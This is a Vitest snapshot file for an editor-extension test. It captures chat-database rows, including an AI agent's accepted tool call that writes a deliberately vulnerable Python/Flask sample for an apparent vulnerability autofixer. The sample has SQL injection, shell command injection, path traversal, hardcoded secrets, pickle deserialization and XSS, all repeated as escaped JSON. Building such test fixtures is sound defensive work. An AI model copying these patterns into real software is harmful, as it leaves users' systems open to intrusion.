// Vitest Snapshot v1, https://vitest.dev/guide/snapshot.html

exports[`extension tests > 'full database scenario with thinking …' > full-thinking-state.vscdb-getRowsByLike-call 1`] = `[]`;

exports[`extension tests > 'full database scenario with thinking …' > full-thinking-state.vscdb-getRowsByLike-call-1 1`] = `
[
  {
    "key": "bubbleId:%",
    "keyOnly": true,
  },
]
`;

exports[`extension tests > 'full database scenario with thinking …' > full-thinking-state.vscdb-getRowsByLike-call-2 1`] = `
[
  {
    "key": "bubbleId:59ce5fe8-21af-47bd-8ace-eedc0956072b:0773d3a3-ed1a-4890-99a3-38ec69a6d85d",
    "keyOnly": false,
  },
]
`;

exports[`extension tests > 'full database scenario with thinking …' > full-thinking-state.vscdb-getRowsByLike-call-3 1`] = `
[
  {
    "key": "composerData:%",
    "keyOnly": false,
    "value": "%c1fe6743-d2fd-4ac7-8caf-324502a41ea1%",
  },
]
`;

exports[`extension tests > 'full database scenario with thinking …' > full-thinking-state.vscdb-getRowsByLike-call-4 1`] = `
[
  {
    "key": "bubbleId:%:b9dda057-0c1e-41fd-bece-80c95ae20984",
    "keyOnly": false,
  },
]
`;

exports[`extension tests > 'full database scenario with thinking …' > full-thinking-state.vscdb-getRowsByLike-call-5 1`] = `
[
  {
    "key": "bubbleId:%:eeb70322-a144-4164-b683-84a3380f4b15",
    "keyOnly": false,
  },
]
`;

exports[`extension tests > 'full database scenario with thinking …' > full-thinking-state.vscdb-getRowsByLike-call-6 1`] = `
[
  {
    "key": "bubbleId:%:4349da38-cb8f-4632-8429-30c4581dbf5d",
    "keyOnly": false,
  },
]
`;

exports[`extension tests > 'full database scenario with thinking …' > full-thinking-state.vscdb-getRowsByLike-call-7 1`] = `
[
  {
    "key": "bubbleId:%:18d48ff7-24fa-4963-a0ed-5edfa4991e61",
    "keyOnly": false,
  },
]
`;

exports[`extension tests > 'full database scenario with thinking …' > full-thinking-state.vscdb-getRowsByLike-call-8 1`] = `
[
  {
    "key": "bubbleId:%:86d43c02-d432-47cf-baa1-e0b405219934",
    "keyOnly": false,
  },
]
`;

exports[`extension tests > 'full database scenario with thinking …' > full-thinking-state.vscdb-getRowsByLike-call-9 1`] = `
[
  {
    "key": "bubbleId:%:b604bdf3-2e76-4f9e-9787-6b23c03937c0",
    "keyOnly": false,
  },
]
`;

exports[`extension tests > 'full database scenario with thinking …' > full-thinking-state.vscdb-getRowsByLike-call-10 1`] = `
[
  {
    "key": "bubbleId:%:5c0b1d2d-0615-4aa6-9b86-2e1c35baa63c",
    "keyOnly": false,
  },
]
`;

exports[`extension tests > 'full database scenario with thinking …' > full-thinking-state.vscdb-getRowsByLike-call-11 1`] = `
[
  {
    "key": "bubbleId:%:98a02221-1a6b-452e-a1f2-8c676df4e040",
    "keyOnly": false,
  },
]
`;

exports[`extension tests > 'full database scenario with thinking …' > full-thinking-state.vscdb-getRowsByLike-call-12 1`] = `
[
  {
    "key": "bubbleId:%:c532d981-529d-4f5b-b53e-ca5331cb0271",
    "keyOnly": false,
  },
]
`;

exports[`extension tests > 'full database scenario with thinking …' > full-thinking-state.vscdb-getRowsByLike-call-13 1`] = `
[
  {
    "key": "bubbleId:%:4406afdc-eddf-4217-ba6b-e4e7600f60be",
    "keyOnly": false,
  },
]
`;

exports[`extension tests > 'full database scenario with thinking …' > full-thinking-state.vscdb-getRowsByLike-call-14 1`] = `
[
  {
    "key": "bubbleId:%:cd8709f0-eaf3-40a0-9694-16f1148756c9",
    "keyOnly": false,
  },
]
`;

exports[`extension tests > 'full database scenario with thinking …' > full-thinking-state.vscdb-getRowsByLike-call-15 1`] = `
[
  {
    "key": "bubbleId:%:3b499564-1816-40db-835a-23e08a45b8a4",
    "keyOnly": false,
  },
]
`;

exports[`extension tests > 'full database scenario with thinking …' > full-thinking-state.vscdb-getRowsByLike-call-16 1`] = `
[
  {
    "key": "bubbleId:%:0773d3a3-ed1a-4890-99a3-38ec69a6d85d",
    "keyOnly": false,
  },
]
`;

exports[`extension tests > 'full database scenario with thinking …' > full-thinking-state.vscdb-getRowsByLike-call-17 1`] = `
[
  {
    "key": "bubbleId:%:57884749-b01a-4465-9de9-36feb1d7cbb3",
    "keyOnly": false,
  },
]
`;

exports[`extension tests > 'full database scenario with thinking …' > full-thinking-state.vscdb-getRowsByLike-call-18 1`] = `
[
  {
    "key": "bubbleId:%:17026129-738c-49a4-ab74-a49b64a0846e",
    "keyOnly": false,
  },
]
`;

exports[`extension tests > 'full database scenario with thinking …' > full-thinking-state.vscdb-getRowsByLike-call-19 1`] = `
[
  {
    "key": "bubbleId:%:53b5b97a-2e9f-43b5-8f42-b8ae8d7fd1bf",
    "keyOnly": false,
  },
]
`;

exports[`extension tests > 'full database scenario with thinking …' > full-thinking-state.vscdb-getRowsByLike-result-1 1`] = `
[
  {
    "key": "bubbleId:59ce5fe8-21af-47bd-8ace-eedc0956072b:0773d3a3-ed1a-4890-99a3-38ec69a6d85d",
  },
  {
    "key": "bubbleId:59ce5fe8-21af-47bd-8ace-eedc0956072b:17026129-738c-49a4-ab74-a49b64a0846e",
  },
  {
    "key": "bubbleId:59ce5fe8-21af-47bd-8ace-eedc0956072b:18d48ff7-24fa-4963-a0ed-5edfa4991e61",
  },
  {
    "key": "bubbleId:59ce5fe8-21af-47bd-8ace-eedc0956072b:3b499564-1816-40db-835a-23e08a45b8a4",
  },
  {
    "key": "bubbleId:59ce5fe8-21af-47bd-8ace-eedc0956072b:40fa4fdd-1005-43cb-8ec4-a73dd867930f",
  },
  {
    "key": "bubbleId:59ce5fe8-21af-47bd-8ace-eedc0956072b:4349da38-cb8f-4632-8429-30c4581dbf5d",
  },
  {
    "key": "bubbleId:59ce5fe8-21af-47bd-8ace-eedc0956072b:4406afdc-eddf-4217-ba6b-e4e7600f60be",
  },
  {
    "key": "bubbleId:59ce5fe8-21af-47bd-8ace-eedc0956072b:46c2e185-bc56-4a2e-a6ab-fa4a557304ef",
  },
  {
    "key": "bubbleId:59ce5fe8-21af-47bd-8ace-eedc0956072b:53b5b97a-2e9f-43b5-8f42-b8ae8d7fd1bf",
  },
  {
    "key": "bubbleId:59ce5fe8-21af-47bd-8ace-eedc0956072b:546387c0-0466-4f79-a9a5-51b9472bcaf8",
  },
  {
    "key": "bubbleId:59ce5fe8-21af-47bd-8ace-eedc0956072b:57884749-b01a-4465-9de9-36feb1d7cbb3",
  },
  {
    "key": "bubbleId:59ce5fe8-21af-47bd-8ace-eedc0956072b:5c0b1d2d-0615-4aa6-9b86-2e1c35baa63c",
  },
  {
    "key": "bubbleId:59ce5fe8-21af-47bd-8ace-eedc0956072b:62424c7f-c3dd-4c66-b59a-c3cb0f3f50d6",
  },
  {
    "key": "bubbleId:59ce5fe8-21af-47bd-8ace-eedc0956072b:86d43c02-d432-47cf-baa1-e0b405219934",
  },
  {
    "key": "bubbleId:59ce5fe8-21af-47bd-8ace-eedc0956072b:98a02221-1a6b-452e-a1f2-8c676df4e040",
  },
  {
    "key": "bubbleId:59ce5fe8-21af-47bd-8ace-eedc0956072b:a43b7de6-801b-4dbd-9245-ff510bde4711",
  },
  {
    "key": "bubbleId:59ce5fe8-21af-47bd-8ace-eedc0956072b:b604bdf3-2e76-4f9e-9787-6b23c03937c0",
  },
  {
    "key": "bubbleId:59ce5fe8-21af-47bd-8ace-eedc0956072b:b8741ffe-00c0-413c-85e5-81a8d2a285f8",
  },
  {
    "key": "bubbleId:59ce5fe8-21af-47bd-8ace-eedc0956072b:b9dda057-0c1e-41fd-bece-80c95ae20984",
  },
  {
    "key": "bubbleId:59ce5fe8-21af-47bd-8ace-eedc0956072b:c532d981-529d-4f5b-b53e-ca5331cb0271",
  },
  {
    "key": "bubbleId:59ce5fe8-21af-47bd-8ace-eedc0956072b:cd8709f0-eaf3-40a0-9694-16f1148756c9",
  },
  {
    "key": "bubbleId:59ce5fe8-21af-47bd-8ace-eedc0956072b:d414328a-23da-4ea2-b2de-48ec1da0b394",
  },
  {
    "key": "bubbleId:59ce5fe8-21af-47bd-8ace-eedc0956072b:db370b22-a755-4c3b-a4bd-447ecd6b2a36",
  },
  {
    "key": "bubbleId:59ce5fe8-21af-47bd-8ace-eedc0956072b:eeb70322-a144-4164-b683-84a3380f4b15",
  },
  {
    "key": "bubbleId:59ce5fe8-21af-47bd-8ace-eedc0956072b:f75418b2-5d9f-4ca3-b53c-67095eef9159",
  },
  {
    "key": "bubbleId:59ce5fe8-21af-47bd-8ace-eedc0956072b:fb06a405-a50b-4ad6-a318-4d576e838bd8",
  },
]
`;

exports[`extension tests > 'full database scenario with thinking …' > full-thinking-state.vscdb-getRowsByLike-result-2 1`] = `
[
  {
    "key": "bubbleId:59ce5fe8-21af-47bd-8ace-eedc0956072b:0773d3a3-ed1a-4890-99a3-38ec69a6d85d",
    "value": "{"_v":3,"type":2,"approximateLintErrors":[],"lints":[],"codebaseContextChunks":[],"commits":[],"pullRequests":[],"attachedCodeChunks":[],"assistantSuggestedDiffs":[],"gitDiffs":[],"interpreterResults":[],"images":[],"attachedFolders":[],"attachedFoldersNew":[],"bubbleId":"0773d3a3-ed1a-4890-99a3-38ec69a6d85d","userResponsesToSuggestedCodeBlocks":[],"suggestedCodeBlocks":[],"diffsForCompressingFiles":[],"relevantFiles":[],"toolResults":[],"notepads":[],"capabilities":[],"capabilityStatuses":{"mutate-request":[],"start-submit-chat":[],"before-submit-chat":[],"chat-stream-finished":[],"before-apply":[],"after-apply":[],"accept-all-edits":[],"composer-done":[],"process-stream":[],"add-pending-action":[]},"multiFileLinterErrors":[],"diffHistories":[],"recentLocationsHistory":[],"recentlyViewedFiles":[],"isAgentic":false,"fileDiffTrajectories":[],"existedSubsequentTerminalCommand":false,"existedPreviousTerminalCommand":false,"docsReferences":[],"webReferences":[],"aiWebSearchResults":[],"requestId":"","attachedFoldersListDirResults":[],"humanChanges":[],"attachedHumanChanges":false,"summarizedComposers":[],"cursorRules":[],"contextPieces":[],"editTrailContexts":[],"allThinkingBlocks":[],"diffsSinceLastApply":[],"deletedFiles":[],"supportedTools":[],"tokenCount":{"inputTokens":0,"outputTokens":0},"attachedFileCodeChunksMetadataOnly":[],"consoleLogs":[],"uiElementPicked":[],"isRefunded":false,"knowledgeItems":[],"documentationSelections":[],"externalLinks":[],"useWeb":false,"projectLayouts":[],"unifiedMode":2,"capabilityContexts":[],"todos":[],"createdAt":"2025-11-05T12:12:26.053Z","isQuickSearchQuery":false,"codeBlocks":[{"uri":{"scheme":"file","authority":"","path":"/Users/jonathanafek/src/autofixer/vulnerable_sample.py","query":"","fragment":"","_formatted":"file:///Users/jonathanafek/src/autofixer/vulnerable_sample.py","_fsPath":"/Users/jonathanafek/src/autofixer/vulnerable_sample.py"},"codeblockId":"c1fe6743-d2fd-4ac7-8caf-324502a41ea1","codeBlockIdx":0,"content":"#!/usr/bin/env python3\\n\\"\\"\\"\\nSample vulnerable code file for testing purposes.\\nThis file contains intentional security vulnerabilities - DO NOT USE IN PRODUCTION.\\n\\"\\"\\"\\n\\nimport os\\nimport subprocess\\nimport sqlite3\\nfrom flask import Flask, request\\n\\napp = Flask(__name__)\\n\\n# VULNERABILITY 1: SQL Injection\\ndef get_user_data(username):\\n    \\"\\"\\"Vulnerable SQL query - concatenates user input directly into SQL.\\"\\"\\"\\n    conn = sqlite3.connect('users.db')\\n    cursor = conn.cursor()\\n    \\n    # VULNERABLE: Direct string concatenation allows SQL injection\\n    query = f\\"SELECT * FROM users WHERE username = '{username}'\\"\\n    cursor.execute(query)\\n    result = cursor.fetchone()\\n    conn.close()\\n    return result\\n\\n\\n# VULNERABILITY 2: Command Injection\\ndef list_files(directory):\\n    \\"\\"\\"Vulnerable command execution - uses user input in shell command.\\"\\"\\"\\n    # VULNERABLE: User input passed directly to shell command\\n    result = subprocess.run(f\\"ls -la {directory}\\", shell=True, capture_output=True)\\n    return result.stdout.decode()\\n\\n\\n# VULNERABILITY 3: Path Traversal\\ndef read_file(filename):\\n    \\"\\"\\"Vulnerable file access - no path validation.\\"\\"\\"\\n    # VULNERABLE: No validation allows accessing files outside intended directory\\n    file_path = f\\"/var/www/uploads/{filename}\\"\\n    with open(file_path, 'r') as f:\\n        return f.read()\\n\\n\\n# VULNERABILITY 4: Hardcoded Secret\\nAPI_KEY = \\"sk_live_1234567890abcdef\\"  # VULNERABLE: Hardcoded secret key\\nDATABASE_PASSWORD = \\"admin123\\"  # VULNERABLE: Hardcoded password\\n\\n\\n# VULNERABILITY 5: Insecure Deserialization\\nimport pickle\\n\\ndef load_user_data(data):\\n    \\"\\"\\"Vulnerable deserialization - uses pickle which can execute arbitrary code.\\"\\"\\"\\n    # VULNERABLE: Pickle can execute arbitrary code during deserialization\\n    user_data = pickle.loads(data)\\n    return user_data\\n\\n\\n# VULNERABILITY 6: XSS (if this were a web template)\\n@app.route('/search')\\ndef search():\\n    \\"\\"\\"Vulnerable endpoint - returns user input without sanitization.\\"\\"\\"\\n    query = request.args.get('q', '')\\n    # VULNERABLE: User input returned directly without escaping\\n    return f\\"<h1>Search results for: {query}</h1>\\"\\n\\n\\nif __name__ == '__main__':\\n    app.run(debug=True)  # VULNERABLE: Debug mode enabled in production\\n","languageId":"python"}],"text":"","capabilityType":15,"toolFormerData":{"tool":38,"toolIndex":1,"modelCallId":"811f23d0-408e-4812-a78a-d986e3544bae","toolCallId":"tool_e77f0c03-54ca-4c4b-b81d-d51fe337eb3","status":"completed","rawArgs":"{\\"file_path\\": \\"/Users/jonathanafek/src/autofixer/vulnerable_sample.py\\", \\"contents\\": \\"#!/usr/bin/env python3\\\\n\\\\\\"\\\\\\"\\\\\\"\\\\nSample vulnerable code file for testing purposes.\\\\nThis file contains intentional security vulnerabilities - DO NOT USE IN PRODUCTION.\\\\n\\\\\\"\\\\\\"\\\\\\"\\\\n\\\\nimport os\\\\nimport subprocess\\\\nimport sqlite3\\\\nfrom flask import Flask, request\\\\n\\\\napp = Flask(__name__)\\\\n\\\\n# VULNERABILITY 1: SQL Injection\\\\ndef get_user_data(username):\\\\n    \\\\\\"\\\\\\"\\\\\\"Vulnerable SQL query - concatenates user input directly into SQL.\\\\\\"\\\\\\"\\\\\\"\\\\n    conn = sqlite3.connect('users.db')\\\\n    cursor = conn.cursor()\\\\n    \\\\n    # VULNERABLE: Direct string concatenation allows SQL injection\\\\n    query = f\\\\\\"SELECT * FROM users WHERE username = '{username}'\\\\\\"\\\\n    cursor.execute(query)\\\\n    result = cursor.fetchone()\\\\n    conn.close()\\\\n    return result\\\\n\\\\n\\\\n# VULNERABILITY 2: Command Injection\\\\ndef list_files(directory):\\\\n    \\\\\\"\\\\\\"\\\\\\"Vulnerable command execution - uses user input in shell command.\\\\\\"\\\\\\"\\\\\\"\\\\n    # VULNERABLE: User input passed directly to shell command\\\\n    result = subprocess.run(f\\\\\\"ls -la {directory}\\\\\\", shell=True, capture_output=True)\\\\n    return result.stdout.decode()\\\\n\\\\n\\\\n# VULNERABILITY 3: Path Traversal\\\\ndef read_file(filename):\\\\n    \\\\\\"\\\\\\"\\\\\\"Vulnerable file access - no path validation.\\\\\\"\\\\\\"\\\\\\"\\\\n    # VULNERABLE: No validation allows accessing files outside intended directory\\\\n    file_path = f\\\\\\"/var/www/uploads/{filename}\\\\\\"\\\\n    with open(file_path, 'r') as f:\\\\n        return f.read()\\\\n\\\\n\\\\n# VULNERABILITY 4: Hardcoded Secret\\\\nAPI_KEY = \\\\\\"sk_live_1234567890abcdef\\\\\\"  # VULNERABLE: Hardcoded secret key\\\\nDATABASE_PASSWORD = \\\\\\"admin123\\\\\\"  # VULNERABLE: Hardcoded password\\\\n\\\\n\\\\n# VULNERABILITY 5: Insecure Deserialization\\\\nimport pickle\\\\n\\\\ndef load_user_data(data):\\\\n    \\\\\\"\\\\\\"\\\\\\"Vulnerable deserialization - uses pickle which can execute arbitrary code.\\\\\\"\\\\\\"\\\\\\"\\\\n    # VULNERABLE: Pickle can execute arbitrary code during deserialization\\\\n    user_data = pickle.loads(data)\\\\n    return user_data\\\\n\\\\n\\\\n# VULNERABILITY 6: XSS (if this were a web template)\\\\n@app.route('/search')\\\\ndef search():\\\\n    \\\\\\"\\\\\\"\\\\\\"Vulnerable endpoint - returns user input without sanitization.\\\\\\"\\\\\\"\\\\\\"\\\\n    query = request.args.get('q', '')\\\\n    # VULNERABLE: User input returned directly without escaping\\\\n    return f\\\\\\"<h1>Search results for: {query}</h1>\\\\\\"\\\\n\\\\n\\\\nif __name__ == '__main__':\\\\n    app.run(debug=True)  # VULNERABLE: Debug mode enabled in production\\\\n\\"}","name":"write","userDecision":"accepted","params":"{\\"relativeWorkspacePath\\":\\"/Users/jonathanafek/src/autofixer/vulnerable_sample.py\\"}","additionalData":{"codeblockId":"c1fe6743-d2fd-4ac7-8caf-324502a41ea1","reviewData":{"status":"None","selectedOption":"accept","isShowingInput":false,"firstTimeReviewMode":false}},"result":"{\\"diff\\":{\\"chunks\\":[{\\"diffString\\":\\"- \\\\n+ #!/usr/bin/env python3\\\\n+ \\\\\\"\\\\\\"\\\\\\"\\\\n+ Sample vulnerable code file for testing purposes.\\\\n+ This file contains intentional security vulnerabilities - DO NOT USE IN PRODUCTION.\\\\n+ \\\\\\"\\\\\\"\\\\\\"\\\\n+ \\\\n+ import os\\\\n+ import subprocess\\\\n+ import sqlite3\\\\n+ from flask import Flask, request\\\\n+ \\\\n+ app = Flask(__name__)\\\\n+ \\\\n+ # VULNERABILITY 1: SQL Injection\\\\n+ def get_user_data(username):\\\\n+     \\\\\\"\\\\\\"\\\\\\"Vulnerable SQL query - concatenates user input directly into SQL.\\\\\\"\\\\\\"\\\\\\"\\\\n+     conn = sqlite3.connect('users.db')\\\\n+     cursor = conn.cursor()\\\\n+     \\\\n+     # VULNERABLE: Direct string concatenation allows SQL injection\\\\n+     query = f\\\\\\"SELECT * FROM users WHERE username = '{username}'\\\\\\"\\\\n+     cursor.execute(query)\\\\n+     result = cursor.fetchone()\\\\n+     conn.close()\\\\n+     return result\\\\n+ \\\\n+ \\\\n+ # VULNERABILITY 2: Command Injection\\\\n+ def list_files(directory):\\\\n+     \\\\\\"\\\\\\"\\\\\\"Vulnerable command execution - uses user input in shell command.\\\\\\"\\\\\\"\\\\\\"\\\\n+     # VULNERABLE: User input passed directly to shell command\\\\n+     result = subprocess.run(f\\\\\\"ls -la {directory}\\\\\\", shell=True, capture_output=True)\\\\n+     return result.stdout.decode()\\\\n+ \\\\n+ \\\\n+ # VULNERABILITY 3: Path Traversal\\\\n+ def read_file(filename):\\\\n+     \\\\\\"\\\\\\"\\\\\\"Vulnerable file access - no path validation.\\\\\\"\\\\\\"\\\\\\"\\\\n+     # VULNERABLE: No validation allows accessing files outside intended directory\\\\n+     file_path = f\\\\\\"/var/www/uploads/{filename}\\\\\\"\\\\n+     with open(file_path, 'r') as f:\\\\n+         return f.read()\\\\n+ \\\\n+ \\\\n+ # VULNERABILITY 4: Hardcoded Secret\\\\n+ API_KEY = \\\\\\"sk_live_1234567890abcdef\\\\\\"  # VULNERABLE: Hardcoded secret key\\\\n+ DATABASE_PASSWORD = \\\\\\"admin123\\\\\\"  # VULNERABLE: Hardcoded password\\\\n+ \\\\n+ \\\\n+ # VULNERABILITY 5: Insecure Deserialization\\\\n+ import pickle\\\\n+ \\\\n+ def load_user_data(data):\\\\n+     \\\\\\"\\\\\\"\\\\\\"Vulnerable deserialization - uses pickle which can execute arbitrary code.\\\\\\"\\\\\\"\\\\\\"\\\\n+     # VULNERABLE: Pickle can execute arbitrary code during deserialization\\\\n+     user_data = pickle.loads(data)\\\\n+     return user_data\\\\n+ \\\\n+ \\\\n+ # VULNERABILITY 6: XSS (if this were a web template)\\\\n+ @app.route('/search')\\\\n+ def search():\\\\n+     \\\\\\"\\\\\\"\\\\\\"Vulnerable endpoint - returns user input without sanitization.\\\\\\"\\\\\\"\\\\\\"\\\\n+     query = request.args.get('q', '')\\\\n+     # VULNERABLE: User input returned directly without escaping\\\\n+     return f\\\\\\"<h1>Search results for: {query}</h1>\\\\\\"\\\\n+ \\\\n+ \\\\n+ if __name__ == '__main__':\\\\n+     app.run(debug=True)  # VULNERABLE: Debug mode enabled in production\\\\n+ \\",\\"oldStart\\":1,\\"newStart\\":1,\\"oldLines\\":1,\\"newLines\\":71,\\"linesRemoved\\":1,\\"linesAdded\\":71}],\\"editor\\":\\"EDITOR_AI\\"},\\"shouldAutoFixLints\\":true,\\"resultForModel\\":\\"Wrote contents to /Users/jonathanafek/src/autofixer/vulnerable_sample.py.\\",\\"contentsAfterEdit\\":\\"#!/usr/bin/env python3\\\\n\\\\\\"\\\\\\"\\\\\\"\\\\nSample vulnerable code file for testing purposes.\\\\nThis file contains intentional security vulnerabilities - DO NOT USE IN PRODUCTION.\\\\n\\\\\\"\\\\\\"\\\\\\"\\\\n\\\\nimport os\\\\nimport subprocess\\\\nimport sqlite3\\\\nfrom flask import Flask, request\\\\n\\\\napp = Flask(__name__)\\\\n\\\\n# VULNERABILITY 1: SQL Injection\\\\ndef get_user_data(username):\\\\n    \\\\\\"\\\\\\"\\\\\\"Vulnerable SQL query - concatenates user input directly into SQL.\\\\\\"\\\\\\"\\\\\\"\\\\n    conn = sqlite3.connect('users.db')\\\\n    cursor = conn.cursor()\\\\n    \\\\n    # VULNERABLE: Direct string concatenation allows SQL injection\\\\n    query = f\\\\\\"SELECT * FROM users WHERE username = '{username}'\\\\\\"\\\\n    cursor.execute(query)\\\\n    result = cursor.fetchone()\\\\n    conn.close()\\\\n    return result\\\\n\\\\n\\\\n# VULNERABILITY 2: Command Injection\\\\ndef list_files(directory):\\\\n    \\\\\\"\\\\\\"\\\\\\"Vulnerable command execution - uses user input in shell command.\\\\\\"\\\\\\"\\\\\\"\\\\n    # VULNERABLE: User input passed directly to shell command\\\\n    result = subprocess.run(f\\\\\\"ls -la {directory}\\\\\\", shell=True, capture_output=True)\\\\n    return result.stdout.decode()\\\\n\\\\n\\\\n# VULNERABILITY 3: Path Traversal\\\\ndef read_file(filename):\\\\n    \\\\\\"\\\\\\"\\\\\\"Vulnerable file access - no path validation.\\\\\\"\\\\\\"\\\\\\"\\\\n    # VULNERABLE: No validation allows accessing files outside intended directory\\\\n    file_path = f\\\\\\"/var/www/uploads/{filename}\\\\\\"\\\\n    with open(file_path, 'r') as f:\\\\n        return f.read()\\\\n\\\\n\\\\n# VULNERABILITY 4: Hardcoded Secret\\\\nAPI_KEY = \\\\\\"sk_live_1234567890abcdef\\\\\\"  # VULNERABLE: Hardcoded secret key\\\\nDATABASE_PASSWORD = \\\\\\"admin123\\\\\\"  # VULNERABLE: Hardcoded password\\\\n\\\\n\\\\n# VULNERABILITY 5: Insecure Deserialization\\\\nimport pickle\\\\n\\\\ndef load_user_data(data):\\\\n    \\\\\\"\\\\\\"\\\\\\"Vulnerable deserialization - uses pickle which can execute arbitrary code.\\\\\\"\\\\\\"\\\\\\"\\\\n    # VULNERABLE: Pickle can execute arbitrary code during deserialization\\\\n    user_data = pickle.loads(data)\\\\n    return user_data\\\\n\\\\n\\\\n# VULNERABILITY 6: XSS (if this were a web template)\\\\n@app.route('/search')\\\\ndef search():\\\\n    \\\\\\"\\\\\\"\\\\\\"Vulnerable endpoint - returns user input without sanitization.\\\\\\"\\\\\\"\\\\\\"\\\\n    query = request.args.get('q', '')\\\\n    # VULNERABLE: User input returned directly without escaping\\\\n    return f\\\\\\"<h1>Search results for: {query}</h1>\\\\\\"\\\\n\\\\n\\\\nif __name__ == '__main__':\\\\n    app.run(debug=True)  # VULNERABLE: Debug mode enabled in production\\\\n\\\\n\\"}"},"checkpointId":"9a40c55f-70bc-459e-a478-7fae8f0843e7"}",
  },
]
`;

exports[`extension tests > 'full database scenario with thinking …' > full-thinking-state.vscdb-getRowsByLike-result-3 1`] = `
[
  {
    "key": "composerData:59ce5fe8-21af-47bd-8ace-eedc0956072b",
    "value": "{"_v":10,"composerId":"59ce5fe8-21af-47bd-8ace-eedc0956072b","richText":"{\\"root\\":{\\"children\\":[{\\"children\\":[],\\"format\\":\\"\\",\\"indent\\":0,\\"type\\":\\"paragraph\\",\\"version\\":1}],\\"format\\":\\"\\",\\"indent\\":0,\\"type\\":\\"root\\",\\"version\\":1}}","hasLoaded":true,"text":"","fullConversationHeadersOnly":[{"bubbleId":"b9dda057-0c1e-41fd-bece-80c95ae20984","type":1},{"bubbleId":"eeb70322-a144-4164-b683-84a3380f4b15","type":2,"serverBubbleId":"0f0d91f6-aa8f-4f0b-b4d8-953973b38e75"},{"bubbleId":"4349da38-cb8f-4632-8429-30c4581dbf5d","type":2},{"bubbleId":"18d48ff7-24fa-4963-a0ed-5edfa4991e61","type":2},{"bubbleId":"86d43c02-d432-47cf-baa1-e0b405219934","type":2,"serverBubbleId":"86f362d9-b233-416c-ac3c-1486e8b2084c"},{"bubbleId":"b604bdf3-2e76-4f9e-9787-6b23c03937c0","type":2},{"bubbleId":"5c0b1d2d-0615-4aa6-9b86-2e1c35baa63c","type":2},{"bubbleId":"98a02221-1a6b-452e-a1f2-8c676df4e040","type":2,"serverBubbleId":"1f003288-5511-4cbb-b6af-97b63b96633d"},{"bubbleId":"c532d981-529d-4f5b-b53e-ca5331cb0271","type":2},{"bubbleId":"4406afdc-eddf-4217-ba6b-e4e7600f60be","type":1},{"bubbleId":"cd8709f0-eaf3-40a0-9694-16f1148756c9","type":2,"serverBubbleId":"33d9cb36-7f74-474c-a5cd-15a7fb1bae04"},{"bubbleId":"3b499564-1816-40db-835a-23e08a45b8a4","type":2},{"bubbleId":"0773d3a3-ed1a-4890-99a3-38ec69a6d85d","type":2},{"bubbleId":"57884749-b01a-4465-9de9-36feb1d7cbb3","type":2,"serverBubbleId":"3685727a-1f95-4ff2-ae4d-cf5482deddbb"},{"bubbleId":"17026129-738c-49a4-ab74-a49b64a0846e","type":2},{"bubbleId":"53b5b97a-2e9f-43b5-8f42-b8ae8d7fd1bf","type":2,"serverBubbleId":"dd8d1547-6b34-47a7-9988-de801a6426e0"},{"bubbleId":"fb06a405-a50b-4ad6-a318-4d576e838bd8","type":2},{"bubbleId":"d414328a-23da-4ea2-b2de-48ec1da0b394","type":2},{"bubbleId":"40fa4fdd-1005-43cb-8ec4-a73dd867930f","type":1},{"bubbleId":"62424c7f-c3dd-4c66-b59a-c3cb0f3f50d6","type":2,"serverBubbleId":"5d1ee044-c5f2-4a87-b415-c3a1e31b9b22"},{"bubbleId":"546387c0-0466-4f79-a9a5-51b9472bcaf8","type":2},{"bubbleId":"f75418b2-5d9f-4ca3-b53c-67095eef9159","type":2},{"bubbleId":"db370b22-a755-4c3b-a4bd-447ecd6b2a36","type":2,"serverBubbleId":"94f8abeb-c428-4b95-822b-24d6406be276"},{"bubbleId":"a43b7de6-801b-4dbd-9245-ff510bde4711","type":2},{"bubbleId":"b8741ffe-00c0-413c-85e5-81a8d2a285f8","type":2,"serverBubbleId":"f567a63c-854f-42fe-b572-b8edef149ef5"},{"bubbleId":"46c2e185-bc56-4a2e-a6ab-fa4a557304ef","type":2}],"conversationMap":{},"status":"completed","context":{"composers":[],"quotes":[],"selectedCommits":[],"selectedPullRequests":[],"selectedImages":[],"folderSelections":[],"fileSelections":[],"selections":[],"terminalSelections":[],"selectedDocs":[],"externalLinks":[],"cursorRules":[],"cursorCommands":[],"uiElementSelections":[],"consoleLogs":[],"mentions":{"composers":{},"quotes":{},"selectedCommits":{},"selectedPullRequests":{},"gitDiff":[],"gitDiffFromBranchToMain":[],"selectedImages":{},"useWeb":[],"folderSelections":{},"fileSelections":{},"terminalFiles":{},"selections":{},"terminalSelections":{},"selectedDocs":{},"externalLinks":{},"useLinterErrors":[],"useDiffReview":[],"useGenerateRules":[],"useContextPicking":[],"useRememberThis":[],"diffHistory":[],"cursorRules":{},"cursorCommands":{},"autoContext":[],"uiElementSelections":{},"consoleLogs":{},"ideEditorsState":[]},"ideEditorsState":true},"gitGraphFileSuggestions":[],"generatingBubbleIds":[],"isReadingLongFile":false,"codeBlockData":{"file:///Users/jonathanafek/src/autofixer/random_file.txt":{"c2f0cb1d-7811-4dcf-936f-598c39d4d42b":{"_v":3,"bubbleId":"5c0b1d2d-0615-4aa6-9b86-2e1c35baa63c","codeBlockIdx":0,"uri":{"$mid":1,"fsPath":"/Users/jonathanafek/src/autofixer/random_file.txt","external":"file:///Users/jonathanafek/src/autofixer/random_file.txt","path":"/Users/jonathanafek/src/autofixer/random_file.txt","scheme":"file"},"codeblockId":"c2f0cb1d-7811-4dcf-936f-598c39d4d42b","status":"completed","languageId":"plaintext","codeBlockDisplayPreference":"collapsed","createdAt":1762344698131,"diffId":"572cac7f-ac14-4821-ad12-9651842b6350","lastDiffId":"5a105e59-4de6-4e65-95a0-765356be4b64","lastAppliedAt":1762344699759}},"file:///Users/jonathanafek/src/autofixer/vulnerable_sample.py":{"c1fe6743-d2fd-4ac7-8caf-324502a41ea1":{"_v":3,"bubbleId":"0773d3a3-ed1a-4890-99a3-38ec69a6d85d","codeBlockIdx":0,"uri":{"$mid":1,"fsPath":"/Users/jonathanafek/src/autofixer/vulnerable_sample.py","external":"file:///Users/jonathanafek/src/autofixer/vulnerable_sample.py","path":"/Users/jonathanafek/src/autofixer/vulnerable_sample.py","scheme":"file"},"codeblockId":"c1fe6743-d2fd-4ac7-8caf-324502a41ea1","status":"completed","languageId":"python","codeBlockDisplayPreference":"collapsed","createdAt":1762344746474,"diffId":"bd7f5dbb-0797-4951-a995-03c99f2fcc26","lastDiffId":"a346a272-1598-40cd-92fc-ac9c25945a68","lastAppliedAt":1762344757813},"923f9628-4497-4fc2-b68a-aa0ab7936253":{"_v":3,"bubbleId":"f75418b2-5d9f-4ca3-b53c-67095eef9159","codeBlockIdx":0,"uri":{"$mid":1,"fsPath":"/Users/jonathanafek/src/autofixer/v